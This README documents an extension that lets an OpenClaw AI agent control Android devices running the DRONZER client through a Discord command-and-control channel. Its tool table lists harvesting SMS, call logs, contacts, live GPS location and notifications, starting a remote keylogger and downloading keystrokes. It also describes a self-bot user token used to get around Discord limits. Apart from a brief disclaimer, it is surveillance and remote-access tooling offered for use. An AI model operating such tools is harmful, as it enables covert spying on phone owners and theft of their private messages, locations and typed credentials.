# Dronzer Ultimate Controller for OpenClaw

The **Dronzer Ultimate Controller** is a high-performance OpenClaw extension designed to orchestrate and manage Android devices running the **DRONZER** suite. It provides a seamless bridge between your OpenClaw agent and your remote device fleet via Discord, enabling autonomous data retrieval, monitoring, and control.

---

## ⚡ Architecture: The Dual-Token System

Dronzer Ultimate uses a sophisticated **Dual-Token Architecture** to ensure maximum reliability and bypass common Discord API limitations:

1.  **The Dispatcher (User Token)**:
    -   Operates as a **Self-Bot**.
    -   Responsible for sending `!` commands (e.g., `!sms`, `!location`, `!devices`) to the designated C2 channel.
    -   Mimics human interaction to trigger device responses.

2.  **The Collector (Bot Token)**:
    -   Operates as a standard **Discord Bot**.
    -   Runs a background polling loop (every 3 seconds) to capture device responses.
    -   Handles multi-part (chunked) responses and large data attachments.
    -   Ensures 24/7 reliability even if the User Token is rate-limited or restricted.

---

## 🚀 Key Features

-   **📡 Multi-Device Orchestration**: Target specific devices using `dronzer_select_unit` or broadcast commands to all online units.
-   **📂 Autonomous Data Dumping**: Automatically saves all retrieved data (SMS, Contacts, Call Logs, etc.) into a structured directory within your workspace.
-   **🧠 Smart Deduplication**: Features content-based hashing to prevent redundant file creation if the device returns identical data.
-   **🔗 Chunked Response Merging**: Automatically merges sequential Discord messages (within 15s) into a single unified log file.
-   **🔄 Rolling History**: Maintains a sliding window of history (10 files for standard data, 100 files for keylogs).
-   **📎 Attachment Processing**: Automatically downloads and extracts content from `.txt` attachments sent by Dronzer units.
-   **🌐 Network Resiliency**: Uses a pure `https` core to bypass standard Node.js/OpenClaw fetch interceptors, preventing common network crashes and header mutations.

---

## 📱 Android Device Setup

To control a device, you must install the **DRONZER** Android client:

1.  **Download the APK**: Get the latest version from [DRONZER Releases](https://github.com/VintageAyu/DRONZER/releases/tag/v6.1.01).
2.  **Configuration**: Open the app settings and enter your **Bot Token** and **Channel ID**.
3.  **Webhook Setup**: Create a Webhook in the target Discord channel. Copy the **Webhook URL** and enter it into the Dronzer Android app settings.
4.  **Sync**: Ensure the `botToken` and `channelId` used in the Android app match exactly what you provide in your OpenClaw configuration.

---

## 🛠️ Installation (Plugin)

1.  **Download**: Locate and install the **Dronzer Controller** directly via [ClawHub](https://clawhub.openclaw.io).
2.  **Install Dependencies**:
    ```bash
    cd extensions/dronzer
    pnpm install && pnpm build
    ```

---

## ⚙️ Configuration

Add the `dronzer` entry to your `openclaw.json` (usually found in `~/.openclaw/` or your project root) under the `plugins.entries` section:

```json
"dronzer": {
  "enabled": true,
  "config": {
    "botToken": "YOUR_DISCORD_BOT_TOKEN",
    "userToken": "YOUR_DISCORD_USER_TOKEN",
    "channelId": "YOUR_DISCORD_CHANNEL_ID",
    "timeoutMs": 60000
  }
}
```

### Configuration Parameters

| Parameter | Type | Required | Description |
| :--- | :--- | :--- | :--- |
| `botToken` | `string` | **Yes** | Standard Discord Bot Token for listening and polling. |
| `userToken` | `string` | **Yes** | Discord User Token (Self-Bot) for dispatching commands. |
| `channelId` | `string` | **Yes** | The Discord Channel ID where Dronzer units are connected. |
| `timeoutMs` | `number` | No | Wait time for device responses (Default: `60000`). |

---

## 🤖 AI Tools & Commands

Once enabled, your OpenClaw agent will have access to the following tools. You can trigger them by simply asking the agent (e.g., *"Read the SMS from the phone"*).

| Tool Name | Discord Command | Functionality |
| :--- | :--- | :--- |
| `dronzer_fetch_devices` | `!devices` | Lists all online/connected Dronzer units. |
| `dronzer_fetch_sms` | `!sms` | Downloads all SMS messages from the target device. |
| `dronzer_fetch_calllogs` | `!calllogs` | Retrieves the complete call history. |
| `dronzer_fetch_contacts` | `!contacts` | Downloads the entire phone book/contacts list. |
| `dronzer_fetch_location` | `!location` | Retrieves real-time GPS coordinates. |
| `dronzer_fetch_notifs` | `!notifs` | Captures the most recent system/app notifications. |
| `dronzer_start_keylogger`| `!keys` | Activates the remote keylogging service. |
| `dronzer_fetch_keys` | `!stop5` | Stops keylogging and downloads the captured buffer. |
| `dronzer_select_unit` | `!select <ID>` | Locks the agent's focus onto a specific device ID. |

---

## 📂 Data Structure

All captured data is stored in the `.dronzer/` directory inside your OpenClaw workspace, organized by **Device ID** and **Data Category**:

```text
.dronzer/
└── [DEVICE_ID]/
    ├── sms/           (10 file rolling history)
    ├── calllogs/      (10 file rolling history)
    ├── contacts/      (10 file rolling history)
    ├── location/      (GPS logs)
    ├── notifs/        (Notification dumps)
    ├── keys/          (100 file rolling history for keylogs)
    └── devices/       (Device status logs)
```

> [!TIP]
> The file `dro-<type>1.txt` is always the most recent capture. As new data arrives, existing files are shifted (`1` -> `2`, `2` -> `3`) until the limit is reached.

---

## ⚖️ Legal Disclaimer

This tool is designed for educational purposes, authorized security auditing, and personal device management. The developers of Dronzer Ultimate and OpenClaw are not responsible for any misuse. Ensure you have explicit permission before monitoring or controlling any device.

## Make sure you fully trust DRONZER app It's open source so you can review the source code before installation and even if you have doubt, open source code in Android Studios and build the app yourself and push it via ADB.
---

**Developed by VintageAyu** | *Built for the OpenClaw Ecosystem*
